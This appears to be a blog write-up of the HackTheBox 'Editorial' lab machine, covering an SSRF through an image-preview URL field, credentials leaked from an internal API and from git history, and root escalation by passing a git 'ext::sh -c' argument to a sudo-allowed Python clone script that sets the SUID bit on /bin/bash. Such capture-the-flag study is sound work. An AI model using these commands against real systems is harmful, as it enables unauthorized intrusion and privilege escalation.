---
title: HTB - Editorial
description: HTB - Editorial
publishDate: 2020-11-18
categories:
  - HackTheBox
tags:
  - SSRF
  - Python
  - Git

---

## Box Info

| Name                  | Editorial        | 
| :-------------------- | ---------------: |
| Release Date          | 15 Jun, 2024     |
| OS                    | Linux            |
| Rated Difficulty      | Easy             |

## **Enumeration**

![Image](image.png)

echo "10.10.11.20 editorial.htb" | sudo tee -a /etc/hosts  
![Image](image-1.png)
whatweb:
![Image](image-2.png)
Web:
![Image](image-3.png)
dirsearch -u http://editorial.htb/ 
![Image](image-4.png)

This page is interesting, we can preview an image from a file or url.

![Image](image-5.png)

## SSRF

The file name is renamed and the file extension is removed. When we open the preview image in a new tab, the file downloaded directly, so it seems like we can’t execute any shell directly.

When I upload a file and add a url "http://127.0.0.1/" and intercept with BurpSuite, we can see the response 200 OK and showing a image directory location, this point to a `SSRF`.

![Image](image-6.png)

In an [SSRF](https://portswigger.net/web-security/ssrf) attack against the server, the attacker causes the application to make an HTTP request back to the server that is hosting the application, via its loopback network interface. This typically involves supplying a URL with a hostname like `127.0.0.1` (a reserved IP address that points to the loopback adapter) or `localhost` (a commonly used name for the same adapter)

![Image](image-7.png)

The response shows us a directory path, let's download the file and see what's inside.

![Image](image-8.png)

![Image](image-9.png)


![Image](image-10.png)

And re upload the file and add the path in burpsuite.

`/api/latest/metadata/messages/authors`{: .filepath}

![Image](image-11.png)

![Image](image-12.png)

Username: dev - Password: dev080217_devAPI!@
![Image](image-13.png)

user flag
![Image](image-14.png)

![Image](image-15.png)

### Linux Enumeration

```bash
find / -user dev 2>/dev/null | grep -vE "sys|proc"
```

![Image](image-16.png)


![Image](image-17.png)

The command `Git show` displays detailed information about a commit.

![Image](image-18.png)


![Image](image-19.png)

080217_Producti0n_2023!@ for prod
- su `prod`
- password: `080217_Producti0n_2023!@`

## Privilege Escalation

sudo -l

![Image](image-20.png)

```bash
- echo '#!/bin/bash' > /tmp/exploit.sh

- echo 'chmod u+s /bin/bash' >> /tmp/exploit.sh
```

![Image](image-21.png)

```bash
- sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c '/tmp/exploit.sh'"
```

![Image](image-22.png)

- `ls -l /bin/bash`

![Image](image-23.png)

Start a new bash session.

- `/bin/bash -p` 

![Image](image-24.png)

